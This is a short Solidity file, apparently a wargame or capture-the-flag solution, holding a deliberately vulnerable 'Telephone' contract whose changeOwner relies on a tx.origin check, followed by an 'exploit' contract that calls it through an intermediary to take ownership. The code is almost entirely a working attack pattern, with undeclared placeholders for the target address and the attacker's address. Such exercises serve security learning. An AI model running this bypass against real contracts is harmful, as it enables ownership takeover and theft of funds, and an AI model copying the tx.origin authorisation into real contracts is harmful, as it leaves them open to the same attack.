pragma solidity ^0.4.18;

contract Telephone {

  address public owner;

  function Telephone() public {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}



contract exploit{
  Telephone contact;
  function exploit(){
    contact = Telephone(contract_sol);
  }  


  function get_owner() public {
  	contact.changeOwner(your_eth_address);
  } 

}
